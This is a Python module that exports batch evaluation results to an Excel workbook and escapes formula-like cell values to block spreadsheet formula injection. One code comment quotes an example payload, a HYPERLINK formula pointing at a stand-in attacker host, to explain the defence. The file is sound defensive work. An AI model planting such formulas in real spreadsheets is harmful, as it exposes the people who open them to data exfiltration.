"""Render a batch run's `BatchResult`s into an xlsx workbook.

The evaluator imports this directly into their grading tool. Two sheets:

  - **summary**: one row per task — id, question, files, dataset, status,
    refusal flag, summary text, finding/evidence/chart counts, joined
    recommendations, elapsed_ms, and (on failure) the error string.

  - **evidence**: one row per emitted Evidence block — task_id,
    finding_index, evidence_index, dataset, table, columns (joined),
    filters, aggregation, value, row_count, sampling_rate, sampling_note.
    Lets the auto-grader replay each Evidence row independently without
    re-parsing the JSON.

We use `openpyxl` directly (not pandas.to_excel) so we can stream into
a `BytesIO` without spinning up an intermediate DataFrame, and so the
column widths can be set deterministically — a wide `summary` column is
the difference between a usable spreadsheet and one that needs manual
resizing every time.
"""

from __future__ import annotations

import io
from typing import Any

from openpyxl import Workbook
from openpyxl.styles import Alignment, Font
from openpyxl.utils import get_column_letter

from app.batch.runner import BatchResult

# Column layout for the "summary" sheet. Order is deliberately stable so
# downstream tools (the grader, the UI) can index by name.
_SUMMARY_HEADERS: list[tuple[str, int]] = [
    ("task_id", 14),
    ("status", 8),
    ("question", 60),
    ("file", 24),
    ("extra_files", 24),
    ("dataset", 18),
    ("response_id", 36),
    ("is_refusal", 10),
    ("summary", 80),
    ("finding_count", 14),
    ("evidence_count", 14),
    ("chart_count", 12),
    ("recommendations", 60),
    ("confidence", 10),
    ("sampling_rate", 12),
    ("sampling_note", 30),
    ("elapsed_ms", 10),
    ("error", 60),
]

_EVIDENCE_HEADERS: list[tuple[str, int]] = [
    ("task_id", 14),
    ("response_id", 36),
    ("finding_index", 12),
    ("evidence_index", 14),
    ("dataset", 18),
    ("table", 24),
    ("columns", 30),
    ("filters", 50),
    ("aggregation", 30),
    ("value", 14),
    ("row_count", 12),
    ("sampling_rate", 12),
    ("sampling_note", 30),
]


def render_xlsx(results: list[BatchResult]) -> bytes:
    """Render a workbook to bytes. Empty result list still produces a
    valid (header-only) workbook so the route always returns something
    streamable.
    """

    wb = Workbook()
    # Workbook ships with one default sheet; rename it instead of
    # creating a new one to avoid a leading blank "Sheet" tab.
    summary_ws = wb.active
    if summary_ws is None:  # defensive — openpyxl always provides one
        summary_ws = wb.create_sheet()
    summary_ws.title = "summary"
    _write_headers(summary_ws, _SUMMARY_HEADERS)

    evidence_ws = wb.create_sheet(title="evidence")
    _write_headers(evidence_ws, _EVIDENCE_HEADERS)

    for result in results:
        _append_summary_row(summary_ws, result)
        _append_evidence_rows(evidence_ws, result)

    # Freeze the header row on both sheets so scrolling through a long
    # batch keeps the column labels visible.
    summary_ws.freeze_panes = "A2"
    evidence_ws.freeze_panes = "A2"

    buf = io.BytesIO()
    wb.save(buf)
    return buf.getvalue()


# ---------------------------------------------------------------------------
# Sheet helpers
# ---------------------------------------------------------------------------


# CodeRabbit #16 round-2: openpyxl writes strings literally and Excel
# evaluates any cell whose first character is one of `=`, `+`, `-`,
# `@` as a formula on open. Attacker-controlled fields (task.question,
# response.summary, recommendations, ev.filters, ev.value, etc.) ride
# user input straight into the workbook the evaluator opens — a
# `=HYPERLINK("http://attacker", "click")` summary becomes a clickable
# exfiltration link. Prefix a single quote so Excel renders the cell
# as text instead of executing it; non-string and non-formula-shaped
# values pass through unchanged.
_FORMULA_LEAD_CHARS = ("=", "+", "-", "@")


def _escape_formula_like(value: Any) -> Any:
    """Return `value` unchanged unless it's a string whose first
    character would trigger Excel formula evaluation, in which case
    prefix a single quote so Excel renders it as text.

    `\\t` and `\\r` are also Excel formula-trigger prefixes in some
    locales but openpyxl already strips control chars for us, so the
    four ASCII punctuation chars cover the realistic attack surface.
    """
    if isinstance(value, str) and value.startswith(_FORMULA_LEAD_CHARS):
        return "'" + value
    return value


def _write_headers(ws: Any, headers: list[tuple[str, int]]) -> None:
    bold = Font(bold=True)
    wrap = Alignment(wrap_text=True, vertical="top")
    for col_idx, (name, width) in enumerate(headers, start=1):
        letter = get_column_letter(col_idx)
        cell = ws.cell(row=1, column=col_idx, value=name)
        cell.font = bold
        cell.alignment = wrap
        ws.column_dimensions[letter].width = width


def _append_summary_row(ws: Any, result: BatchResult) -> None:
    response = result.response
    task = result.task

    if response is not None:
        recs = "; ".join(response.recommendations)
        is_refusal = response.is_refusal
        confidence = response.confidence
        summary = response.summary
        finding_count = len(response.findings)
        evidence_count = sum(len(f.evidence) for f in response.findings)
        chart_count = len(response.charts)
        response_id = response.id
    else:
        recs = ""
        is_refusal = ""
        confidence = ""
        summary = ""
        finding_count = ""
        evidence_count = ""
        chart_count = ""
        response_id = ""

    row = [
        _escape_formula_like(task.id),
        result.status,
        _escape_formula_like(task.question),
        _escape_formula_like(task.file),
        _escape_formula_like("; ".join(task.extra_files)),
        _escape_formula_like(task.dataset or ""),
        _escape_formula_like(response_id),
        is_refusal,
        _escape_formula_like(summary),
        finding_count,
        evidence_count,
        chart_count,
        _escape_formula_like(recs),
        confidence if confidence is not None else "",
        task.sampling_rate if task.sampling_rate is not None else "",
        _escape_formula_like(task.sampling_note or ""),
        round(result.elapsed_ms, 1),
        _escape_formula_like(result.error or ""),
    ]
    ws.append(row)
    # Wrap the long-text columns so multi-line summary / recommendations
    # don't disappear off the right edge of the cell on import.
    last_row = ws.max_row
    wrap = Alignment(wrap_text=True, vertical="top")
    for col_idx, (name, _) in enumerate(_SUMMARY_HEADERS, start=1):
        if name in {"question", "summary", "recommendations", "error", "sampling_note"}:
            ws.cell(row=last_row, column=col_idx).alignment = wrap


def _append_evidence_rows(ws: Any, result: BatchResult) -> None:
    response = result.response
    if response is None:
        return  # error rows have no evidence; surfaced via summary instead
    task = result.task
    for f_idx, finding in enumerate(response.findings):
        for e_idx, ev in enumerate(finding.evidence):
            ws.append(
                [
                    _escape_formula_like(task.id),
                    _escape_formula_like(response.id),
                    f_idx,
                    e_idx,
                    _escape_formula_like(ev.dataset),
                    _escape_formula_like(ev.table),
                    _escape_formula_like("; ".join(ev.columns)),
                    _escape_formula_like(ev.filters),
                    _escape_formula_like(ev.aggregation),
                    _escape_formula_like(ev.value),
                    ev.row_count if ev.row_count is not None else "",
                    ev.sampling_rate if ev.sampling_rate is not None else "",
                    _escape_formula_like(ev.sampling_note or ""),
                ]
            )
